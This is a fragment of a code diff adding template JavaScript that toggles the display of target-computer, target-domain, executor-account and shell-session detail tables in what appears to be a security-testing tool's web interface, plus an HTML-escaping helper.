+            controllableShellSessionDetailsTr.forEach((tr) => {
+              tr.style.display = "";
+            })
+          } else {
+            shellTypeSelect.style.display = "none";
+            controllableShellSessionDetailsTr.forEach((tr) => {
+              tr.style.display = "none";
+            })
+          }
+        }
+      });
+    });
+  });
+}
+
+function displayTargetComputerDetails() {
+  var targetComputerTableBody = document.querySelectorAll('tbody[id="targetComputerTableBody"]');
+  var selectedTargetComputerDetailsIpAddress = document.getElementById("targetComputerDetailsIpAddressDropdown").value;
+  targetComputerTableBody.forEach((tableBody) => {
+    if (selectedTargetComputerDetailsIpAddress === tableBody.dataset.targetipaddress) {
+      tableBody.style.display = "";
+    } else {
+      tableBody.style.display = "none";
+    }
+  });
+};
+
+function displayTargetDomainDetails() {
+  var targetDomainTableBody = document.querySelectorAll('tbody[id="targetDomainTableBody"]');
+  var selectedTargetDomainDetailsDomainName = document.getElementById("targetDomainDetailsDomainNameDropdown").value;
+  targetDomainTableBody.forEach((tableBody) => {
+    if (selectedTargetDomainDetailsDomainName === tableBody.dataset.targetdomainname) {
+      tableBody.style.display = "";
+    } else {
+      tableBody.style.display = "none";
+    }
+  });
+};
+
+function displayExecutorSettings() {
+  var executorUserAccountDropDownValue = document.getElementById("executorUserAccountDropDown").value;
+  var executorTableBody = document.querySelectorAll('tbody[id="executorTableBody"]');
+  executorTableBody.forEach((tableBody) => {
+    if (executorUserAccountDropDownValue === tableBody.dataset.username) {
+      tableBody.style.display = "";
+    } else {
+      tableBody.style.display = "none";
+    }
+  });
+}
+
+function escapeHtml(htmlStr) {
+   return htmlStr.replace(/&/g, "&amp;")
+         .replace(/</g, "&lt;")
+         .replace(/>/g, "&gt;")
+         .replace(/"/g, "&quot;")
+         .replace(/'/g, "&#39;");
+}
+</script>
+{% endblock %}
